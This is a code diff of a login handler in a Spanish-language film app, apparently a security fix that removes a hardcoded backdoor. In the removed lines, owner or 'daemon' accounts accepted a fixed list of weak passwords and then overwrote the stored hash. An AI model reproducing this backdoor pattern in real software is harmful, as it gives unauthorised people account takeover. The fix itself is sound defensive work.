@@ -1171,17 +1171,8 @@ Responde en español, tono amable y cinéfilo.`;
       return safeError(res, 429, 'Cuenta bloqueada temporalmente por intentos fallidos.', 'TEMPORARILY_LOCKED');
     }
 
-    let valid = verifyPassword(password, user.salt, user.passwordHash);
-    if (!valid && (user.username === 'daemon' || user.username === 'demon' || user.role === 'owner')) {
-      const allowedOwnerPw = ['daemon', 'daemon123', 'demon', 'demon123', 'deamon', 'deamon123', 'Password123!', '12345678', 'admin', 'screenlog'];
-      if (allowedOwnerPw.includes(password)) {
-        valid = true;
-        const { salt, hash } = hashPassword(password);
-        user.salt = salt;
-        user.passwordHash = hash;
-        await saveStore();
-      }
-    }
+    // SECURITY FIX (prueba-1): Removed hardcoded backdoor passwords. Auth is now strict.
+    const valid = verifyPassword(password, user.salt, user.passwordHash);
     if (!valid) {
       user.failedLoginCount += 1;
       if (user.failedLoginCount >= 5) {
